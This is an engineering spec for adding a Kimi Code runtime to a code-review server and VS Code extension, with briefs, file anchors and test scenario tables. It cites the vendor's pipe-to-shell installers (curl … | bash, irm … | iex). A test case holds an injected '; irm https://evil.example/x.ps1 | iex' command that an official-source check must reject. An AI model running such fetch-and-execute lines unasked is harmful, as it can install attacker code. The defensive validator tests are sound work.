- `src_mcp/runners/Reviewers/ReviewerExecutor.cs` — `RateLimit` `:247-363` (`Phrases` `:265` include `quota`, `Hit`
  `:297-298` scans stdout AND stderr, `Spent` `:318`); `Classified` `:961-990` (`RateLimit.Hit(result)` at `:963`
  decides BEFORE any adapter is asked, and its branch answers `Usage.None`); `UsageOf` `:993-994`; `LaunchAsync` /
  the turn `:872-882` (the warning carried).
- `src_mcp/runners/Reviewers/BoundedScheduler.cs:89-96` (ctor, `perProviderCap = 2` at `:91`), `:174-188` (`Limiter`),
  `:211-215` (the per-provider limiters built from `work` — the place a capability is read), `:238` (`MachineLaneAsync`),
  `:595-645` (the retry ladder and `Hopeless`).
- `src_mcp/runners/Reviewers/VendorDiagnosis.cs` — `Known` `:47` (markers → sentences), `InstallCure` `:275`, the `vibe`
  arms `:285-287`. `src_mcp/runners/Reviewers/VendorProbe.cs:216-234` (probe → `VersionWarning`).
- `src_mcp/runners/Acp/KimiAcpProfile.cs:37-54` (the shim's known failures and their names: `subscription_model`,
  `not_signed_in`, `balance_spent`), and the shim's exits `AskAcpMode.cs:37-43`.
- Seeds: `shared/feature-availability.json` — `runtimes` `:23`, the `vibe` rows at `:79-83` (`effort`), `:123-125`
  (`thinking`), `:180` (`fastMode`); generated `src_vs_code/src/featureAvailability.generated.ts`, `fastMode.generated.ts`.
- Tests that hard-code runtime lists (parent §3): `FeatureAvailabilityTests.cs:71`, `EveryAdapterRecordsWhatItLaunchedTests.cs:73`,
  `ChildEnvironmentTests.cs:33-39`; the loops over `RuntimeNames` (`VendorRuntimeSurvivesParsingTests`,
  `AnUnknownRuntimeIsRefusedByNameTests`) pick `kimi` up by themselves. The Vibe tests to mirror:
  `VibeRuntimeTests`, `AVibeReviewerRunsThroughAFakeVibeTests`, `VibeIsDiagnosedInItsOwnWordsTests`.

**BRIEF.**
1. **`src_mcp/runners/Kimi/KimiRuntime.cs`** — `public sealed class KimiRuntime(string id, HostKind host) : IReviewerRuntime`
   with the `(string id = "kimi")` overload, as `VibeRuntime`. Members:
   - `Build`: model = `settings.Model` or `KimiModels.Default` (E4.2); home = `HomeFor(settings.OwnedScratch` or
     `outputDir, Provider, role)` → `<scratch>/kh-<10 hex of sha256(provider/role)>` holding `home/` and `os/` as E4.2
     lays them out. The request: `LocalRuntime.SelfInvocation()` (prefix when no configured path — the shim is THIS
     binary; a row's `ExecutablePath` is the `kimi` path and goes to `--executable`, never replaces the shim), argv
     `[..prefix, "--ask-acp", "--profile", "kimi", "--model", model, "--cwd", worktreePath, "--home", <home>,
     "--deadline-seconds", LocalAsk.ShimDeadlineSeconds(settings.Timeout), "--executable", <absolute kimi>]` — the
     absolute `kimi` resolved HERE, in the unredirected parent (`settings.ExecutablePath` or
     `KimiAcpProfile.InstalledExecutable`), so the shim never re-derives it from a redirected profile (E4.2's trap);
     `StdIn = prompt`, `Timeout = settings.Timeout`, cwd `worktreePath`; then through `KimiLaunch.Built` (the shim's own
     hop, D19 "on both hops"). `Model: model` on the invocation. No effort, no tier (seeds say unmeasured/none).
   - `NeedsASanitisedSnapshot => true` (D6 — the round already gives `worktreePath` = the snapshot for an adapter that
     asks); `LaunchesOneAtATime => true` (step 3); `TakeTurnAsync` → `KimiLaunch.TakeAsync(host, invocation.Request,
     launcher, ct)`; `DefaultExecutable` → the SHIM is not what `providers` probes: return `KimiAcpProfile.InstalledExecutable`
     (the `kimi` CLI — what the card's version and install state are about).
   - `ProbeVersionAsync`: `kimi --version` in `KimiLaunch.Built`'s environment on a THROWAWAY owned folder made under a
     `coai-answers-` temp directory and deleted in `finally` (the `VibeRuntime.cs:99-124` shape) — NO junction and NO
     config: `kimi --version` writes nothing and needs no sign-in (§18); never the inherited environment, never the
     person's home (D19, the Vibe precedent). `VersionWarning(printed)` → E4.2's shared builder for a version outside
     `KimiAcpProfile.MeasuredVersions`, empty inside it.
   - `ReadAnswer` → the report's `answer` when `end == "answered"`, else null. `ReadUsage` → a pure
     `KimiReport.Parse(stdout)`: `usage.tokensIn/tokensOut`; `usage.notCaptured == true` or an unparseable report →
     `Usage.Unknown`; never a cost (`CostUsd = null`, D9). `WhyItFailed` → `"<failure>: <reason>"` from the report (the
     shim's `failure` name and `reason`), or the reason alone.
   - **Register**: `ReviewerRuntimeSelector.Default` (`:835-836`), `RuntimeNames` (`:851-855`, `"kimi"`), `Named`
     (`"kimi" => new Kimi.KimiRuntime(vendorId)`), `MachineOnlyRuntimes` (`:870-871`, D12 — with a remarks sentence like
     the `vibe` one).
2. **Classification from the report, never from text** (parent §4 S4, risk consultation `ba5f661a`). Add to
   `IReviewerRuntime` a default member `RateLimitVerdict RateLimited(ReviewerInvocation invocation, ProcessResult result)`
   whose default body is exactly today's (`RateLimit.Hit(result)` → limited with `RateLimit.Reason(result)` and
   `Usage.None`), and make `Classified` (`ReviewerExecutor.cs:961-967`) ask it instead of `RateLimit.Hit` directly — so
   every other adapter is byte-identical. `KimiRuntime` overrides: limited ONLY when the exit is 75 and the report's
   `failure` is `balance_spent` (the reason is the report's `reason`, which carries `insufficient balance`, so
   `RateLimit.Hopeless` names it spent and the ladder stops — D14); the verdict CARRIES the report's usage
   (`KimiReport.Parse`), so a spent launch keeps `notCaptured` rather than a fabricated zero. Every other exit falls
   through to the ordinary path (NonZeroExit with `WhyItFailed`), whatever text the trace holds.
3. **One Kimi launch of a round at a time** (D19, until M-K14). `IReviewerRuntime` gains `bool LaunchesOneAtATime =>
   false`. In `BoundedScheduler.RunAllAsync` (`:211-215`) the cap passed to `Limiter` is `1` for a provider whose
   invocation's adapter says `LaunchesOneAtATime`, else `perProviderCap` — one pure helper `CapFor(ReviewerWork)`,
   CC ≤ 4. The limiter is created once per provider for the scheduler's life (`:174-188`), so the first run's cap
   sticks — correct, since a provider id's runtime does not change within one server. This is the in-process half; the
   cross-process half is E4.2's gate.
4. **`VendorDiagnosis`** — `InstallCure("kimi", linux)`: Windows → `irm https://code.kimi.com/kimi-code/install.ps1 |
   iex` (and Git for Windows first, which Kimi's docs require — `winget install Git.Git`); Linux/macOS → `curl -fsSL
   https://code.kimi.com/kimi-code/install.sh | bash` (Moonshot's getting-started page, read 2026-10-14, §E4.5). `Known`
   gains the shim's three names as markers (`subscription_model:`, `not_signed_in:`, `balance_spent:` — the shim writes
   `<name>: <reason> — <cure>` on stderr, `AskAcpMode.cs:158`) mapped to sentences that keep the shim's cure; and
   `model_not_offered` (E4.3) → "the Kimi session does not offer this model — pick one the plan has". Never a phrase
   match on Kimi's own trace text.
5. **Seeds** — `shared/feature-availability.json`: `runtimes` gains `kimi`; `effort` `unmeasured` (note: `thinking` has
   `low`/`high`/`max` on the k3 models, M-K7, nothing measured it taking effect — parent §4 S4), `thinking` `unmeasured`
   (same note), `fastMode` `none`; regenerate with `node src_vs_code/scripts/generate-feature-availability.mjs` and
   commit the generated files. NOT `runtime-capabilities.json` and NOT `features.consultant` — those are S5's (a runtime
   may never enter `runtime-capabilities.json` without its own `ConfinementPlanner` arm, parent §3).
6. **Docs**: `research/module_runners.md` (`KimiRuntime`, the classification seam, `LaunchesOneAtATime`),
   `research/architecture.md` (the runtime list), README's runtime list, CHANGELOG.

**SCENARIOS** (red first; classes `KimiRuntimeTests`, `AKimiReviewerRunsThroughTheShimTests`, `KimiIsClassifiedFromItsReportTests`,
`OneKimiLaunchAtATimeTests`, `KimiIsDiagnosedInItsOwnWordsTests`).

| # | Given | When | Then | Expected red today |
|---|---|---|---|---|
| S4.1 `TheShimRequest_CarriesTheFlagsAndNeverThePrompt` | settings with a model, a 10-minute timeout, `OwnedScratch` a test folder | `Build` | argv holds `--ask-acp --profile kimi --model <id> --cwd <worktree> --home <scratch>/kh-<10 hex>/home --deadline-seconds <n> --executable <absolute>`; no argument holds the prompt or a newline; `StdIn` is the prompt; `KimiLaunch.EnvironmentRefusal(request)` is empty | (class does not exist — compile red) |
| S4.2 `KimiIsRegistered_AndMachineOnly` | — | `Default.Find("kimi")`, `Named("kimi","my-kimi")`, `RuntimeNames`, `MachineOnlyRuntimes` | found; the id is `my-kimi`; both sets hold `kimi`; the existing `RuntimeNames` loops pass; the Team server refuses a `kimi` row by name | `Find` null |
| S4.3 `AnAnsweredReport_IsTheAnswer_AndItsUsage` | a captured report: `end answered`, `answer "{…}"`, `usage {tokensIn 19973, tokensOut 31, notCaptured false}` | `ReadAnswer`, `ReadUsage` | the answer text; usage 19973/31, `CostUsd` null | — |
| S4.4 `ANotCapturedReport_IsUnknownUsage_NeverZero` | the report with `notCaptured true` (and a second case: stdout not JSON) | `ReadUsage` | `Usage.Unknown` both | — |
| S4.5 `ASpentBalance_IsOneLaunch_NamedSpent` (executor AND scheduler) | a scripted launcher answering exit 75, report `failure: balance_spent`, reason `… insufficient balance …`, `usage.notCaptured true` | one reviewer through `BoundedScheduler.RunAllAsync` | outcome `RateLimited`, `RateLimit.Hopeless(reason)` true, the launcher was called ONCE, usage unknown (not `Usage.None`) | usage `Usage.None` (the branch drops it) |
| S4.6 `ASignInRefusalWhoseTraceSaysQuota_IsNotARateLimit` | exit 77, report `failure: not_signed_in`, and the report's `reads` trace holds a path `src/quota.cs` and a tool title `check rate limit` | one reviewer through the scheduler | outcome `NonZeroExit(77)` with `not_signed_in` in its reason; ONE launch; never `RateLimited` | `RateLimited` (`Phrases` holds `quota` and `rate limit`, `ReviewerExecutor.cs:265`), retried up the ladder |
| S4.7 `ACleanSignInRefusal_IsOneLaunch` | exit 77, report `failure: not_signed_in`, no quota text | the scheduler | `NonZeroExit(77)`, one launch | (green — pins the plain case) |
| S4.8 `EveryOtherAdapter_IsClassifiedAsBefore` | a codex adapter, a stdout naming `rate limit` with exit 1 | the executor | `RateLimited`, exactly as today | (green — pins the default body of the seam) |
| S4.9 `TwoKimiReviewersOfOneRound_NeverOverlap` | three reviewers of provider `kimi` whose scripted launches each take 300 ms, and two of provider `vibe` (a fake adapter without `LaunchesOneAtATime`) | `RunAllAsync` | `PeakPerProvider["kimi"] == 1`; `PeakPerProvider["vibe"] == 2` | `PeakPerProvider["kimi"] == 2` |
| S4.10 `TheProbe_NeverTouchesThePersonsHome` | a scripted launcher recording the request | `ProbeVersionAsync` | the request's `KIMI_CODE_HOME` is a fresh folder under temp that is GONE afterwards; `InheritsEnvironment` false; `USERPROFILE` is not the parent's | the default probe: inherited environment, `Environment.CurrentDirectory` |
| S4.11 `AnUnmeasuredKimi_WarnsOnTheCard_AndTheLine` | `VersionWarning("kimi, version 2.2.0")`; a measured `2.1.1`; and one full launch through the executor with a scripted `--version` of 2.2.0 | — | the shared builder's sentence naming 2.2.0 and 2.1.1; empty for 2.1.1; the reviewer outcome's `Warning` holds the same sentence | empty (default member) |
| S4.12 `KimiIsDiagnosedInItsOwnWords` | stderr `not_signed_in: … — run \`kimi login\` …`, `subscription_model: …`, `balance_spent: …`, `model_not_offered …`; `InstallCure("kimi", true/false)` | `VendorDiagnosis` | a sentence per name that keeps the cure; the two install lines exactly as in §E4.5 | null / codex's cure |
| S4.13 `TheSeedsKnowKimi` | — | `FeatureAvailabilityTests`, the generator's `--check` | `kimi` in `runtimes`; `effort` and `thinking` `unmeasured`, `fastMode` `none`; generated TS current | missing rows |
| S4.14 `EveryAdapterRecordsWhatItLaunched` (`EveryAdapterRecordsWhatItLaunchedTests.cs:73`) | the list gains `kimi` | — | the adapter's invocation names its model | the list lacks it |

**Done when** every scenario is green through BOTH the executor and the scheduler where the table says so, the whole
suite is green, and — the live check that unit tests cannot replace (parent §5) — one `providers` call on the owner's
machine shows the Kimi row's version and its warning, recorded in `research/module_tests.md`. The live plan and code
rounds are the parent's DoD, after E4.5.

## E4.5 — The extension row: runtime, models, preset, colour, ▶, `crossesTo`, install and update per OS

`model: opus` spec (this document) · Sonnet codes · Opus reviews.

**Goal.** In the extension, Kimi is a runtime a person adds from the catalog's preset, picks a curated model for, sees
in its own colour, opens with ▶ (plain interactive `kimi`), installs and updates with ONE press on Windows, Linux/WSL and
macOS through Moonshot's official installer — and an older `coai-mcp` never receives the row.

**The official sources — verified 2026-10-14, cited, never guessed.**
- Moonshot's getting-started page, `https://www.kimi.com/code/docs/en/kimi-code-cli/guides/getting-started`
  (`…/getting-started.html` redirects there): macOS and Linux — `curl -fsSL https://code.kimi.com/kimi-code/install.sh | bash`;
  Windows (PowerShell) — `irm https://code.kimi.com/kimi-code/install.ps1 | iex`; npm — `npm install -g
  @moonshot-ai/kimi-code` (Node.js ≥ 22.19.0); Windows needs **Git for Windows before the first launch** (Kimi runs its
  shell through Git Bash; `KIMI_SHELL_PATH` names a custom `bash.exe`); upgrade — `kimi upgrade` or the npm line.
- The two scripts (`code.kimi.com/kimi-code/install.{ps1,sh}` → 302 → `cdn.kimi.com/kimi-code/install.{ps1,sh}`,
  read 2026-10-14): install into `%USERPROFILE%\.kimi-code\bin\kimi.exe` / `$HOME/.kimi-code/bin/kimi` (`KIMI_INSTALL_DIR`
  overrides) — the path `KimiAcpProfile.InstalledExecutableFor` already expects; download only from
  `https://code.kimi.com/kimi-code/latest`, `…/binaries/<version>/manifest.json` and `…/binaries/<version>/kimi-code-<target>.tar.gz`;
  verify SHA-256 from the manifest; put `bin` on the user `PATH` (Windows: the user `PATH`; POSIX: one rc file) unless
  `KIMI_NO_MODIFY_PATH`; **re-running installs the latest over the old one** (the old binary kept as `.bak`) — so
  re-running the script IS the update; `install.sh` refuses Windows and Alpine/musl; neither script downloads `rg`/`fd`.
- Today's latest is **2.2.0** (`https://code.kimi.com/kimi-code/latest` answers `2.2.0`; npm
  `@moonshot-ai/kimi-code` `latest` 2.2.0); the 2.1.1 manifest's `tag` is `@moonshot-ai/kimi-code@2.1.1` — the script's
  binaries and the npm package are one release line.

**Files and anchors (verified).**
- `src_vs_code/src/models.ts` — `RUNTIMES` `:35`, `CLI_RUNTIMES` `:46`, `VIBE_MODELS` `:124-127`, `VIBE_MODELS_SEEN_ON`
  `:130`, `CURATED_FOR` `:133`, `modelsFor` (`:184`, the comment at `:221`), `modelsProvenance` `:357-364`.
- `src_vs_code/src/vendors.ts:290-305` (the Vibe preset — the shape; its hint names the server version from
  `runtimeSince.ts`).
- `src_vs_code/src/vendorColour.ts:60-73` (`VENDOR_PALETTE`), `:93-100` (`ANCHORED`; used slots 0, 1, 3, 4, 6, 10).
- `src_vs_code/src/vendorTerminal.ts` — `USAGE_COMMAND` `:27-37`, `EXECUTABLE` `:40-46`, `MODEL_FLAG` `:52-58`,
  `TERMINAL_ENV` `:64-66`, `vendorUpdate` `:108-114`, `installAgain` `:128-141`, `SELF_UPDATE` `:156-160`, `PACKAGE`
  `:306-310`, `DOCS` `:313-319`, `vibeInstall`/`vibeUpdate` `:389-418` (the per-OS shape and its sourced remarks),
  `OWN_INSTALLER` `:486-489`, `OWN_UPDATE` `:492-494`.
- `src_vs_code/src/officialSources.ts:17-28` (`OFFICIAL_SOURCES`), `:57-64` (`fromOfficialSources`; `INSTALL_WORDS`
  `:49` — a step holding `upgrade` that no verb reads is REFUSED, so `kimi upgrade` would not pass this check).
- `src_vs_code/src/cliVersions.ts:25-28` (`VersionSource`), `:31-35` (`NPM_PACKAGE` — the version LIGHT's source,
  separate from the install), `:80-90` (`versionSourceFor`).
- `src_vs_code/src/runtimeSince.ts:28-34` (`VIBE_RUNTIME_SINCE`, `RUNTIME_SINCE`), `src_vs_code/src/vendorsWire.ts:113-115`
  (`crossesTo` → `runtimeOnServer`); `.release-please-manifest.json` (`src_mcp` `0.53.0` released today).
- `src_vs_code/src/panelView.ts:1187` (`KNOWS_ITS_OWN_ENDPOINT`); `src_vs_code/src/catalogWriteRules.ts:58`
  (`JUDGED_HERE`, derived from `RUNTIMES` — no edit, a test); `modelCardWorld.ts:109` and `setupTab.ts:28` read
  `CLI_RUNTIMES`; `modelCardWorld.ts:142` (`versionWarningNote` — runtime-neutral, reads `providers[].warning`).
- `src_vs_code/package.json:461` and `:993` (the two runtime enums).
- Help: `helpContent.ts`, `help.ts`, `helpRu.ts`, `helpUk.ts`, `helpDe.ts`, `helpEs.ts` (the Vibe row is the model).
- Tests to mirror and lists to extend: `src_vs_code/src/test/vibeRuntime.test.ts`, `vibeWindowsInstall.test.ts`,
  `vibeWindowsInstallRuns.test.ts`, and parent §3's hard-coded lists (`runtimeSurvives.test.ts:89`,
  `vendorTerminal.test.ts:116`, `cliVersions.test.ts:103`, `addModelGroups.test.ts:8`, `vendorColour.test.ts:108,121`,
  `featureAvailability.test.ts:64`, `capabilityAdmission.test.ts:143`, `consultant.test.ts:616`).

**BRIEF.**
1. **Runtime and enums**: `'kimi'` appended to `RUNTIMES` and `CLI_RUNTIMES`; both `package.json` enums.
2. **Models** (D10): `KIMI_MODELS` — `kimi-code/k3-256k` ("K3-256k — answered 64 paid turns in the probe"),
  `kimi-code/k3` ("K3"), `kimi-code/kimi-for-coding` ("K2.8 Preview"), `kimi-code/kimi-for-coding-highspeed` (label says
  the Kimi Code plan answers it 401 unless the plan includes it); `KIMI_MODELS_SEEN_ON = '2.1.1'`; the list EQUALS
  `KimiModels.Curated` on the server (E4.2) — a test reads both (the C# list from its source file, as other parity tests
  in this repository do, or a shared seed if E4.2 chose one). `CURATED_FOR.kimi`; `modelsProvenance.kimi`: a curated
  list; coai-mcp refuses an id outside `kimi-code/` before the launch (it would bill the person's API key) and checks the
  id against the session's own list inside the shim.
3. **Preset** (D11): `label 'Kimi Code'`, `id 'kimi'`, `runtime 'kimi'`, `model KIMI_MODELS[0].id`, `plan/code true`; the
  hint: Kimi Code on the person's Kimi Code plan, signed in as itself (`kimi login`), Windows only for now (D18), the
  `coai-mcp` version from `KIMI_RUNTIME_SINCE`, and that a Kimi row's three reviewers run one after another (D19).
4. **Colour**: `ANCHORED.kimi = 11` (`#8FA8C8`, slate — a free slot; Kimi's own mark is monochrome, so a neutral slot);
  the anchors list in `vendorColour.test.ts` gains it.
5. **Terminal ▶**: `EXECUTABLE.kimi = 'kimi'`; `MODEL_FLAG.kimi = ''` (▶ is the person's own interactive `kimi`, never
  `acp`, never a model flag nobody measured); no `TERMINAL_ENV` entry (no `KIMI_CODE_HOME`: this is the person's own
  Kimi in their own home — where `kimi login` signs coai's launches in, through the junction); `USAGE_COMMAND.kimi =
  '/usage'` (RESULTS §5: Kimi's own command, answered without a model call); `DOCS.kimi =
  'https://www.kimi.com/code/docs/en/kimi-code-cli/guides/getting-started'`.
6. **Install and update per OS** (D16; the owner's order: the buttons work on every OS). `kimiInstall(platform)`:
   `win32` → `irm https://code.kimi.com/kimi-code/install.ps1 | iex`, prerequisite `winget install Git.Git` (Kimi's
   documented Windows prerequisite), note: the folder (`%USERPROFILE%\.kimi-code\bin`), that the installer puts it on the
   user PATH and VS Code must restart before ▶ finds it, then sign in — `kimi`, then `/login` — which only the person can
   do; `linux`/`darwin` → `curl -fsSL https://code.kimi.com/kimi-code/install.sh | bash`, note: it edits one shell rc
   file, sign in the same way, and coai-mcp does not run Kimi on Linux, WSL or macOS yet (D18) — the button still
   installs it there, as the owner ordered. `kimiUpdate` = `kimiInstall` (re-running the script installs the latest —
   the scripts, read 2026-10-14); NOT `kimi upgrade`: it is documented but unmeasured here, and `fromOfficialSources`
   refuses a step saying `upgrade` that no verb reads — changing the check for one unmeasured command is not worth it.
   Register both in `OWN_INSTALLER` and `OWN_UPDATE`. Write the sources into the remarks as the Vibe block does.
7. **`OFFICIAL_SOURCES`**: `urls` gains exactly `'https://code.kimi.com/kimi-code/'` (the domain AND path — not
   `cdn.kimi.com`, which the command never names; the redirect is the publisher's). `packages` gains nothing (nothing is
   npm-installed).
8. **The update light**: `NPM_PACKAGE.kimi = '@moonshot-ai/kimi-code'` in `cliVersions.ts` — the version SOURCE only (the
   same release line as the script's binaries, see the sources above); `vendorTerminal.ts`'s `PACKAGE` stays without
   `kimi`, so the update command is the script, never npm. Correct D16's "neither is on npm" for Kimi in the remarks.
9. **`KIMI_RUNTIME_SINCE`** in `runtimeSince.ts` and its arm in `RUNTIME_SINCE`: the next MINOR after the newest released
   `src_mcp` in `.release-please-manifest.json` at the commit that lands this story — 0.53.0 is released today and S3
   (#811, a `feat`) is not; if #811 releases first, Kimi's is 0.55.0, if both ride one release 0.54.0. The remarks say
   which, and that whoever cuts the release keeps it level with the tag (the Vibe constant's rule).
10. `KNOWS_ITS_OWN_ENDPOINT` gains `'kimi'`. The card's version warning needs no code — `versionWarningNote` is
   runtime-neutral — only a test that a `kimi` row shows it.
11. **Help** in five languages (the Vibe row's shape): what the row is, Windows-only, the sign-in, serialised launches,
   the version warning; NOT "the owned home never receives code" (M-K12 (c) is unrecorded, parent D19). CHANGELOG;
   `research/module_extension.md` (the row, the per-OS install, the mixed-version limit of D13 for `kimi` beside
   `vibe`'s).

**SCENARIOS** (red first; a new `src_vs_code/src/test/kimiRuntime.test.ts` mirroring `vibeRuntime.test.ts`, and
`kimiWindowsInstall.test.ts` mirroring `vibeWindowsInstall.test.ts`).

| # | Given | When | Then | Expected red today |
|---|---|---|---|---|
| S5.1 `aKimiRowSurvivesParsing` | a saved row `{runtime:'kimi'}` | `vendorsFrom` | `runtime === 'kimi'` (not `codex`) | becomes `codex` (`vendors.ts:392`) |
| S5.2 `kimiOffersItsCuratedListAndNeverGeminis` | — | `modelsFor('kimi')` | the four ids in order; never a Gemini id; provenance names the `kimi-code/` rule | the Gemini list |
| S5.3 `theCuratedListMatchesTheServers` | the C# `KimiModels.Curated` (E4.2) | read both | equal, in order | — (no list) |
| S5.4 `thePresetRoundTrips` | the `Kimi Code` preset | added, saved, read back through `vendorsFrom` | id, runtime, model and flags intact; hint names `KIMI_RUNTIME_SINCE` | preset absent |
| S5.5 `kimiHasItsOwnColour` | `kimi` with every anchored runtime configured | colour allocation | slot 11, never shared | hashed slot |
| S5.6 `playOpensPlainKimi` | a `kimi` row with a model | `vendorTerminal` | command `kimi` (or the row's CLI path), no `acp`, no model flag, no `KIMI_CODE_HOME` in `env` | `codex -m …` (the unknown-runtime fallback, `vendorTerminal.ts:215`) |
| S5.7 `installIsMoonshotsPerOs` | `kimi` on `win32`, `linux`, `darwin` | `vendorInstall` | exactly the two documented lines; Windows prerequisite `winget install Git.Git`; each `fromOfficialSources` true | the npm/codex fallback, or an unofficial line |
| S5.8 `updateIsTheInstallerAgain` | the same three platforms, an installed `2.1.1` | `vendorUpdate` | the install line again (never `kimi upgrade`, never npm); `fromOfficialSources` true | `npm install -g …` or codex's |
| S5.9 `officialSourcesAdmitOnlyMoonshotsPath` | `irm https://code.kimi.com/kimi-code/install.ps1 \| iex` ; `…/kimi-code.evil.example/…` ; `https://code.kimi.com/other/x.ps1 \| iex` ; the install line `; irm https://evil.example/x.ps1 \| iex` | `fromOfficialSources` | true ; false ; false ; false | the first is false (prefix not admitted) |
| S5.10 `theWindowsLineParsesInPowerShell` (`kimiWindowsInstall.test.ts`) | the `win32` install command | PowerShell's own parser (the Vibe test's harness) | no parse error | — (no command) |
| S5.11 `theUpdateLightReadsNpm` | `versionSourceFor('kimi', p, a)` | — | `{ kind: 'npm', package: '@moonshot-ai/kimi-code' }` | undefined |
| S5.12 `anOlderServerNeverGetsAKimiRow` | installed server one minor below `KIMI_RUNTIME_SINCE`; an enabled `kimi` row and a `codex` row | the settings mirror (`vendorsWire`) | the `kimi` row withheld, the `codex` row sent, the card's note names `KIMI_RUNTIME_SINCE`; at `KIMI_RUNTIME_SINCE` the row crosses; an unknown server version → crosses | the `kimi` row crosses |
| S5.13 `theCardShowsKimisVersionWarning` | a `providers` report for the `kimi` row with a `warning` | the model card renders | the warning sentence is on the card, in the warning tone | — (pins neutrality) |
| S5.14 the hard-coded lists (parent §3) and `helpCoverage.test.ts` | — | the suite | every list holds `kimi`; the help has the Kimi row in five languages | list mismatches |

**Done when** `npm run typecheck`, `npm run lint` and `npm test` are green, the generators' `--check` is clean, and the
live checks are recorded in `research/module_tests.md`: the Install button on Windows run once on a machine without
`kimi` (or a `testsToDelete-` `KIMI_INSTALL_DIR`, so the owner's install is never overwritten — the scripts honour it)
and once in WSL — the owner's order is that the buttons work per OS, so the WSL run is not optional here even though
D18 still refuses a Kimi REVIEW there.

## Where the parent plan and the code disagree (found while splitting, 2026-10-14)

1. **S3 is not on `main`.** The parent's S4 lists GitScratch's reparse-point safety, D20's sweep and the junction test as
   S4 work; all three already exist on `feat/vibe-consultant` (#811, open). E4.1 is written to build on them (§0).
2. **The version warning is a string, not a record.** D19 asks for "a record on the launch result built by one builder";
   S2 shipped `LaunchTurn.Warning` as a string built only by `VibeLaunch.Unmeasured` (`VibeLaunch.cs:269-273`). E4.2
   extracts one builder for both; the transport stays a string (the card and the reviewer line already carry it).
3. **"A named mutex"** (D19) does not survive an `await` (thread-affine) and is not the repository's cross-process
   primitive (`HeldFile`). E4.2 records the deviation.
4. **Ripgrep is not put in `~/.kimi-code/bin` by Moonshot's installer** (both scripts, read 2026-10-14); it is Kimi's own
   download on a run at home. The `PATH` guarantee therefore fails on a fresh install whose person never ran Kimi's
   `Grep` — E4.2 must decide the pre-launch answer.
5. **D16 "neither is on npm"** is false for Kimi today: `@moonshot-ai/kimi-code` is on npm (2.2.0) and is the same
   release line as the script's binaries. E4.5 reads versions from npm and still installs through the script.
6. **Kimi 2.2.0 is out** (measured: 2.1.1). With the owner's `auto_install = true`, the version warning will show from the
   first launch — the owner's warn-and-run rule doing its job; re-running the probe on 2.2.0 makes it measured.
7. **The shim inside a redirected environment.** D19 builds the SHIM's own request with the OS-home redirect too; a
   process whose `USERPROFILE` is `os/` cannot locate the person's `~/.kimi-code` again (`KimiAcpProfile.cs:71-76` reads
   `SpecialFolder.UserProfile`). E4.2 pins that the person's paths are resolved once in the parent and passed down; E4.4
   always passes `--executable` absolute.
8. **The `.mcp.json` exclusion** is "project-root" in D6/§21, but `SnapshotExclusions` matches a separator-free entry at
   every depth. E4.3 keeps the stricter every-depth match and says so.

## Definition of Done (this epic)

- [ ] E4.1 and E4.2 have SCENARIOS and BRIEF written by Fable before their coders start; the ledger line in the parent
      reads `Cornerstones: 2 of 2`.
- [ ] Every scenario of E4.3–E4.5 (and Fable's for E4.1–E4.2) is a test that was watched red with the expected message,
      then green; both suites green; `dotnet format --verify-no-changes` clean; generators current.
- [ ] No test made a junction outside its own `testsToDelete-` folder; every test leftover is named `testsToDelete-…`.
- [ ] A Kimi row added from the preset reviews one plan round and one code round live through the product on Windows
      (the parent's DoD), with the version warning shown on the card when the installed Kimi is not 2.1.1.
- [ ] The parent plan's S4 block records the deviations above as they land, and this document and the parent promote
      together (planning-docs.md, *A plan split into epics and stories*).
